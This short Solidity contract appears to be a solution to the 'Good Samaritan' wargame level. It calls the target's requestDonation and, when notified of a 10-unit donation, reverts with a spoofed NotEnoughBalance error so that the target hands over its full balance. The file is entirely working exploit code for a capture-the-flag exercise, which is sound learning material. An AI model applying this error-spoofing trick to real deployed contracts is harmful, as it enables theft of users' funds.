// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable} from "./GoodSamaritan.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract SolveGoodSamaritan is INotifyable {
    error NotEnoughBalance();

    function requestDonation(address samAddr) external {
        require(samAddr.code.length > 0, "samAddr is not a contract");

        IGoodSamaritan gs = IGoodSamaritan(samAddr);
        gs.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
